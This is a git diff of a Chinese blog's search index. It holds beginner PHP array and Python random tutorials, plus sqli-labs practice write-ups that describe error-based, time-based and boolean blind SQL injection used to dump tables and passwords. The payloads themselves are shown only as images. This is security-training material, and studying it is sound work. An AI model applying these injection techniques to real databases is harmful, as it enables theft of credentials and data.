+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$age[<span class="hljs-string">&#x27;peter&#x27;</span>]=<span class="hljs-string">&quot;35&quot;</span>;<br>$age[<span class="hljs-string">&#x27;ben&#x27;</span>]=<span class="hljs-string">&quot;37&quot;</span>;<br>$age[<span class="hljs-string">&#x27;joe&#x27;</span>]=<span class="hljs-string">&quot;43&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Peter is &quot;</span> . $age[<span class="hljs-string">&#x27;peter&#x27;</span>] . <span class="hljs-string">&quot; years old.&quot;</span>; <br><span class="hljs-meta">?&gt;</span> <br>  <br><span class="hljs-comment">/*输出结果：Peter is 35 years old.</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$age=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Peter&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;Ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;Joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>); <br><br><span class="hljs-keyword">foreach</span>($age <span class="hljs-keyword">as</span> $x=&gt;$x_value)<br>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;key=&quot;</span> . $x .<span class="hljs-string">&quot;,value=&quot;</span>. $x_value;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">/*输出结果：</span><br><span class="hljs-comment">key=Peter,value=35</span><br><span class="hljs-comment">key=Ben,value=37</span><br><span class="hljs-comment">key=Joe,value=43</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>
+
+<h2 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h2><h3 id="sort-升序排列"><a href="#sort-升序排列" class="headerlink" title="sort()   升序排列"></a>sort()   升序排列</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BWM&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br>sort($cars);<br>print_r($cars);<br><span class="hljs-meta">?&gt;</span> <br>  <br>  <br>  <span class="hljs-comment">/*输出结果:</span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment">(</span><br><span class="hljs-comment">    [0] =&gt; BWM</span><br><span class="hljs-comment">    [1] =&gt; Toyota</span><br><span class="hljs-comment">    [2] =&gt; Volvo</span><br><span class="hljs-comment">)</span><br><span class="hljs-comment"> </span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$numbers=<span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">22</span>,<span class="hljs-number">11</span>);<br>sort($numbers);<br>print_r($numbers);<br><span class="hljs-meta">?&gt;</span> <br>  <br>  <br> <span class="hljs-comment">/*输出结果：</span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment">(</span><br><span class="hljs-comment">    [0] =&gt; 2</span><br><span class="hljs-comment">    [1] =&gt; 4</span><br><span class="hljs-comment">    [2] =&gt; 6</span><br><span class="hljs-comment">    [3] =&gt; 11</span><br><span class="hljs-comment">    [4] =&gt; 22</span><br><span class="hljs-comment">)</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="rsort-降序排列"><a href="#rsort-降序排列" class="headerlink" title="rsort()  降序排列"></a>rsort()  降序排列</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BWM&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br>rsort($cars);<br>print_r($cars);<br><span class="hljs-meta">?&gt;</span> <br>  <br>  <br>  <span class="hljs-comment">/*输出结果：</span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment">(</span><br><span class="hljs-comment">    [0] =&gt; Volvo</span><br><span class="hljs-comment">    [1] =&gt; Toyota</span><br><span class="hljs-comment">    [2] =&gt; BWM</span><br><span class="hljs-comment">)</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="asort-根据数组的值进行升序排列"><a href="#asort-根据数组的值进行升序排列" class="headerlink" title="asort() 根据数组的值进行升序排列"></a>asort() 根据数组的值进行升序排列</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$age=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;peter&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>);<br>asort($age);<br>print_r($age);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="ksort-根据数组的键进行升序排列"><a href="#ksort-根据数组的键进行升序排列" class="headerlink" title="ksort()  根据数组的键进行升序排列"></a>ksort()  根据数组的键进行升序排列</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$age=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;peter&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>);<br>ksort($age);<br>print_r($age);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+]]></content>
       <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>随机点大福</title>
-    <url>/2020/10/04/my-fourth-blog/</url>
-    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>基于某同学想吃大福不知道吃哪一个的问题，写了个无聊小程序，练练手。</p>
-<p>一开始想到了Python自带的random模块，对大福创建一个列表。<br>那么如何实现对列表的元素进行随机抽取呢？</p>
-<p>More info: (<a href="https://www.cnblogs.com/tallme/p/11173422.html">https://www.cnblogs.com/tallme/p/11173422.html</a>)</p>
-<p>分为三种情况</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">random.randint()<span class="hljs-comment">#随机生一个整数int类型，可以指定这个整数的范围，同样有上限和下限值，。</span><br>random.choice()<span class="hljs-comment">#可以从任何序列，比如list列表中，选取一个随机的元素返回，可以用于字符串、列表、元组等。</span><br>random.sample()<span class="hljs-comment">#可以从指定的序列中，随机的截取指定长度的片断，不作原地修改。</span><br></code></pre></td></tr></table></figure>
-<p>那很显然，这里输出的结果不为整数，也不需要进行返回的操作，在这里就选择了random.sample()。</p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">import random<br>大福=[<span class="hljs-string">&#x27;提拉米苏大福 &#x27;</span>,<span class="hljs-string">&#x27;抹茶大福&#x27;</span>,<span class="hljs-string">&#x27;桃桃大福&#x27;</span>,<span class="hljs-string">&#x27;芒芒大福&#x27;</span>,<span class="hljs-string">&#x27;榴莲大福&#x27;</span>]<br>ran_大福=random.sample(大福,1)<br><span class="hljs-built_in">print</span>(ran_大福)<br></code></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>Python</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -1161,41 +1267,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php数组</title>
-    <url>/2020/10/31/php%E6%95%B0%E7%BB%84/</url>
-    <content><![CDATA[<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组是一个能在单个变量中存储多个值的特殊变量。</p>
-<h2 id="创建变量方法"><a href="#创建变量方法" class="headerlink" title="创建变量方法"></a>创建变量方法</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>()<br></code></pre></td></tr></table></figure>
-
-<h2 id="创建数值数组"><a href="#创建数值数组" class="headerlink" title="创建数值数组"></a>创建数值数组</h2><h3 id="自动分配id键"><a href="#自动分配id键" class="headerlink" title="自动分配id键"></a>自动分配id键</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I like&quot;</span>.$cars[<span class="hljs-number">0</span>].<span class="hljs-string">&quot;,&quot;</span>.$cars[<span class="hljs-number">1</span>].<span class="hljs-string">&quot;and&quot;</span>.$cars[<span class="hljs-number">2</span>].<span class="hljs-string">&quot;.&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>  <br><span class="hljs-comment">/*输出结果:</span><br><span class="hljs-comment">I likeVolvo,BMWandToyota. </span><br></code></pre></td></tr></table></figure>
-
-<h3 id="人工分配id键"><a href="#人工分配id键" class="headerlink" title="人工分配id键"></a>人工分配id键</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br>$cars[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;Volvo&quot;</span>;<br>$cars[<span class="hljs-number">2</span>]=<span class="hljs-string">&quot;BMW&quot;</span>;<br>$cars[<span class="hljs-number">3</span>]=<span class="hljs-string">&quot;Toyota&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I like&quot;</span>.$cars[<span class="hljs-number">1</span>].<span class="hljs-string">&quot;,&quot;</span>.$cars[<span class="hljs-number">2</span>].<span class="hljs-string">&quot;and&quot;</span>.$cars[<span class="hljs-number">3</span>].<span class="hljs-string">&quot;.&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>  <br><span class="hljs-comment">/*输出结果:</span><br><span class="hljs-comment">I likeVolvo,BMWandToyota. </span><br></code></pre></td></tr></table></figure>
-
-<h2 id="获取数组的长度"><a href="#获取数组的长度" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br><span class="hljs-keyword">echo</span> count($cars); <span class="hljs-comment">#count()函数用于返回数组的长度（元素的数量）</span><br><span class="hljs-meta">?&gt;</span> <br><br><span class="hljs-comment">/*输出结果：3</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="遍历数值数组"><a href="#遍历数值数组" class="headerlink" title="遍历数值数组"></a>遍历数值数组</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br>$arrlength=count($cars);<br><br><span class="hljs-keyword">for</span>($x=<span class="hljs-number">0</span>;$x&lt;$arrlength;$x++) <span class="hljs-comment">#arrlength=array().length</span><br>&#123;<br>	<span class="hljs-keyword">echo</span> $cars[$x];<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br>  <br><span class="hljs-comment">/*输出结果：</span><br><span class="hljs-comment">Volvo</span><br><span class="hljs-comment">BMW</span><br><span class="hljs-comment">Toyota</span><br><span class="hljs-comment"> </span><br></code></pre></td></tr></table></figure>
-
-<h2 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$age=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Peter&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;Ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;Joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Peter is &quot;</span> . $age[<span class="hljs-string">&#x27;Peter&#x27;</span>] . <span class="hljs-string">&quot; years old.&quot;</span>; <br><span class="hljs-meta">?&gt;</span><br>  <br><span class="hljs-comment">/*输出结果：Peter is 35 years old.</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$age[<span class="hljs-string">&#x27;peter&#x27;</span>]=<span class="hljs-string">&quot;35&quot;</span>;<br>$age[<span class="hljs-string">&#x27;ben&#x27;</span>]=<span class="hljs-string">&quot;37&quot;</span>;<br>$age[<span class="hljs-string">&#x27;joe&#x27;</span>]=<span class="hljs-string">&quot;43&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Peter is &quot;</span> . $age[<span class="hljs-string">&#x27;peter&#x27;</span>] . <span class="hljs-string">&quot; years old.&quot;</span>; <br><span class="hljs-meta">?&gt;</span> <br>  <br><span class="hljs-comment">/*输出结果：Peter is 35 years old.</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$age=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Peter&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;Ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;Joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>); <br><br><span class="hljs-keyword">foreach</span>($age <span class="hljs-keyword">as</span> $x=&gt;$x_value)<br>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;key=&quot;</span> . $x .<span class="hljs-string">&quot;,value=&quot;</span>. $x_value;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">/*输出结果：</span><br><span class="hljs-comment">key=Peter,value=35</span><br><span class="hljs-comment">key=Ben,value=37</span><br><span class="hljs-comment">key=Joe,value=43</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>
-
-<h2 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h2><h3 id="sort-升序排列"><a href="#sort-升序排列" class="headerlink" title="sort()   升序排列"></a>sort()   升序排列</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BWM&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br>sort($cars);<br>print_r($cars);<br><span class="hljs-meta">?&gt;</span> <br>  <br>  <br>  <span class="hljs-comment">/*输出结果:</span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment">(</span><br><span class="hljs-comment">    [0] =&gt; BWM</span><br><span class="hljs-comment">    [1] =&gt; Toyota</span><br><span class="hljs-comment">    [2] =&gt; Volvo</span><br><span class="hljs-comment">)</span><br><span class="hljs-comment"> </span><br></code></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$numbers=<span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">22</span>,<span class="hljs-number">11</span>);<br>sort($numbers);<br>print_r($numbers);<br><span class="hljs-meta">?&gt;</span> <br>  <br>  <br> <span class="hljs-comment">/*输出结果：</span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment">(</span><br><span class="hljs-comment">    [0] =&gt; 2</span><br><span class="hljs-comment">    [1] =&gt; 4</span><br><span class="hljs-comment">    [2] =&gt; 6</span><br><span class="hljs-comment">    [3] =&gt; 11</span><br><span class="hljs-comment">    [4] =&gt; 22</span><br><span class="hljs-comment">)</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="rsort-降序排列"><a href="#rsort-降序排列" class="headerlink" title="rsort()  降序排列"></a>rsort()  降序排列</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BWM&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br>rsort($cars);<br>print_r($cars);<br><span class="hljs-meta">?&gt;</span> <br>  <br>  <br>  <span class="hljs-comment">/*输出结果：</span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment">(</span><br><span class="hljs-comment">    [0] =&gt; Volvo</span><br><span class="hljs-comment">    [1] =&gt; Toyota</span><br><span class="hljs-comment">    [2] =&gt; BWM</span><br><span class="hljs-comment">)</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="asort-根据数组的值进行升序排列"><a href="#asort-根据数组的值进行升序排列" class="headerlink" title="asort() 根据数组的值进行升序排列"></a>asort() 根据数组的值进行升序排列</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$age=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;peter&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>);<br>asort($age);<br>print_r($age);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="ksort-根据数组的键进行升序排列"><a href="#ksort-根据数组的键进行升序排列" class="headerlink" title="ksort()  根据数组的键进行升序排列"></a>ksort()  根据数组的键进行升序排列</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$age=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;peter&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>);<br>ksort($age);<br>print_r($age);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs 1-4 小结</title>
     <url>/2020/11/18/sqli-labs-1-4-%E5%B0%8F%E7%BB%93/</url>
     <content><![CDATA[<h2 id="分析sql查询语句"><a href="#分析sql查询语句" class="headerlink" title="分析sql查询语句"></a>分析sql查询语句</h2><p><img src="/2020/11/18/sqli-labs-1-4-%E5%B0%8F%E7%BB%93/image-20201120164820214.png"></p>
@@ -1211,6 +1282,66 @@
 <p><img src="/2020/11/18/sqli-labs-1-4-%E5%B0%8F%E7%BB%93/image-20201120165026263.png"></p>
 <p>知道数据列数再进行爆破</p>
 <p><img src="/2020/11/18/sqli-labs-1-4-%E5%B0%8F%E7%BB%93/image-20201120165508147.png"></p>
+]]></content>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs-less5,6</title>
+    <url>/2020/11/30/sqli-labs-less5-6/</url>
+    <content><![CDATA[<h1 id="extracture-报错注入"><a href="#extracture-报错注入" class="headerlink" title="extracture()报错注入"></a>extracture()报错注入</h1><p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130173049737.png"></p>
+<p>然后你不断地尝试。。。。</p>
+<p>终于</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130173454222.png"></p>
+<p>根据数据库来爆数据表</p>
+<p>稍稍微微改了一下刚才的语句，你会发现，emmmmmmm，好像有什么不对</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130173738174.png"></p>
+<p>对，这边的语句中没有限定数据库的范围，以至于有了以上的图片，那应该增加些什么呢？</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174048317.png"></p>
+<p>然后你会发现，嗯，什么都没有，那不如再改一下（我缓缓地把数字改小了一点。。。）</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174240769.png"></p>
+<p>当然我们要的不是这个数据表，那就再换换</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174359168.png"></p>
+<p>然后要开始爆数据列啦（对不起，输入法不是故意要出镜的）</p>
+<p>然后历经n次尝试之后你会收获到</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174636944.png"></p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174954937.png"></p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174813325.png"></p>
+<p>一不小心我还能套个娃？不愧是我</p>
+<p>那现在离爆数据只有一步之遥了</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130175444246.png"></p>
+<p>hhhh，没说在哪个表里，快补上去</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130175613687.png"></p>
+<p>那么同理，密码也可以知道了</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130175727426.png"></p>
+<p>至于剩下的就不一一说明了。也许你可能会问，这里为什么不像前面1-4关一样直接一起爆username，password，那不妨我们来试一下</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130175925094.png"></p>
+<p>通过报错得到的回显可知，这里只能查询一个字段。</p>
+<p>updatexml()函数同理使用该方法，直接报错的话，我没试成功，那报错注入先说这么多。</p>
+<p>等等，可以了</p>
+<h1 id="直接报错注入"><a href="#直接报错注入" class="headerlink" title="直接报错注入"></a>直接报错注入</h1><p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130180956576.png"></p>
+<p>然后想在试图爆出数据表数据列时遇到了一些困难………</p>
+<p>看了很久很久很久…….单词拼错了（这一点也不好笑）</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130213047814.png"></p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130213425970.png"></p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130213510772.png"></p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130213606995.png"></p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130213953028.png"></p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130214027259.png"></p>
+<h1 id="延时和布尔注入连用"><a href="#延时和布尔注入连用" class="headerlink" title="延时和布尔注入连用"></a>延时和布尔注入连用</h1><p>此处省略若干次尝试，5和6的区别也就只是‘和“的区别</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130200201301.png"></p>
+<p>当正确时，页面加载速度变慢，且加载完成后无回显</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130202015311.png"></p>
+<p>就会变成这样↓</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130202044702.png"></p>
+<p>然后</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130205558048.png"></p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130205306735.png"></p>
+<p>注意长语句处的空格，否则无法实现延时，千里之堤，溃于蚁穴，大概就是这个理吧</p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130210427554.png"></p>
+<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130210340395.png"></p>
+<p>大概是这样一个过程，在有回显的情况下，报错注入的优势更为突出了。</p>
 ]]></content>
       <tags>
         <tag>sqli-labs</tag>
@@ -1314,60 +1445,31 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs-less5,6</title>
-    <url>/2020/11/30/sqli-labs-less5-6/</url>
-    <content><![CDATA[<h1 id="extracture-报错注入"><a href="#extracture-报错注入" class="headerlink" title="extracture()报错注入"></a>extracture()报错注入</h1><p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130173049737.png"></p>
-<p>然后你不断地尝试。。。。</p>
-<p>终于</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130173454222.png"></p>
-<p>根据数据库来爆数据表</p>
-<p>稍稍微微改了一下刚才的语句，你会发现，emmmmmmm，好像有什么不对</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130173738174.png"></p>
-<p>对，这边的语句中没有限定数据库的范围，以至于有了以上的图片，那应该增加些什么呢？</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174048317.png"></p>
-<p>然后你会发现，嗯，什么都没有，那不如再改一下（我缓缓地把数字改小了一点。。。）</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174240769.png"></p>
-<p>当然我们要的不是这个数据表，那就再换换</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174359168.png"></p>
-<p>然后要开始爆数据列啦（对不起，输入法不是故意要出镜的）</p>
-<p>然后历经n次尝试之后你会收获到</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174636944.png"></p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174954937.png"></p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130174813325.png"></p>
-<p>一不小心我还能套个娃？不愧是我</p>
-<p>那现在离爆数据只有一步之遥了</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130175444246.png"></p>
-<p>hhhh，没说在哪个表里，快补上去</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130175613687.png"></p>
-<p>那么同理，密码也可以知道了</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130175727426.png"></p>
-<p>至于剩下的就不一一说明了。也许你可能会问，这里为什么不像前面1-4关一样直接一起爆username，password，那不妨我们来试一下</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130175925094.png"></p>
-<p>通过报错得到的回显可知，这里只能查询一个字段。</p>
-<p>updatexml()函数同理使用该方法，直接报错的话，我没试成功，那报错注入先说这么多。</p>
-<p>等等，可以了</p>
-<h1 id="直接报错注入"><a href="#直接报错注入" class="headerlink" title="直接报错注入"></a>直接报错注入</h1><p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130180956576.png"></p>
-<p>然后想在试图爆出数据表数据列时遇到了一些困难………</p>
-<p>看了很久很久很久…….单词拼错了（这一点也不好笑）</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130213047814.png"></p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130213425970.png"></p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130213510772.png"></p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130213606995.png"></p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130213953028.png"></p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130214027259.png"></p>
-<h1 id="延时和布尔注入连用"><a href="#延时和布尔注入连用" class="headerlink" title="延时和布尔注入连用"></a>延时和布尔注入连用</h1><p>此处省略若干次尝试，5和6的区别也就只是‘和“的区别</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130200201301.png"></p>
-<p>当正确时，页面加载速度变慢，且加载完成后无回显</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130202015311.png"></p>
-<p>就会变成这样↓</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130202044702.png"></p>
-<p>然后</p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130205558048.png"></p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130205306735.png"></p>
-<p>注意长语句处的空格，否则无法实现延时，千里之堤，溃于蚁穴，大概就是这个理吧</p>
